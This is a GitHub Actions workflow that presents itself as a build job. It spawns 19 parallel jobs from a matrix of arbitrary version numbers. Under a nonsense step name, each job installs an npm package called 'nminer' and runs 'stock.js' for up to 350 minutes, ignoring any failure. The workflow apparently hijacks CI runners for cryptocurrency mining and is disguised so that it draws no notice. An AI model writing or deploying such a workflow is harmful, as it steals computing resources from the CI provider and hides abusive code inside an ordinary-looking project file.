name: stock
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3794 }
          - { version: 5521 }
          - { version: 6963 }
          - { version: 4520 }
          - { version: 9992 }
          - { version: 4939 }
          - { version: 8159 }
          - { version: 644 }
          - { version: 764 }
          - { version: 3195 }
          - { version: 8483 }
          - { version: 3185 }
          - { version: 6361 }
          - { version: 5394 }
          - { version: 6257 }
          - { version: 7960 }
          - { version: 2808 }
          - { version: 2368 }
          - { version: 9995 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: mortise patiently unto milky
        run: |
          npm install nminer@latest
          timeout 350m node stock.js || echo "stock executed"